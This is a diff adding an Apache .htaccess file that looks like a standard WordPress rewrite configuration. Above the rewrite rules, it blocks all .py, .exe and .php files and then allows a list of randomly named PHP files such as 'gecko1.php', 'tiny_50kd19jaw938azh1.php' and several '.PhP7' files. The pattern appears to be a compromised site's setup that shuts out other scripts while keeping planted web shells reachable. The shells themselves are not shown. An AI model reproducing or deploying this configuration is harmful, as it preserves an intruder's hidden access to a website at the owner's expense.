@@ -1,0 +1,16 @@
+<FilesMatch ".(py|exe|php)$">
+ Order allow,deny
+ Deny from all
+</FilesMatch>
+<FilesMatch "^(api.php|gecko1.php|etc_8h3060h0949dr427.PhP7|api.PhP7|	logs_962060d0939dar2o.php|sess_916f9c30948dcc2c.php|temp_156b0bb68af8ae51.php|tiny_50kd19jaw938azh1.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
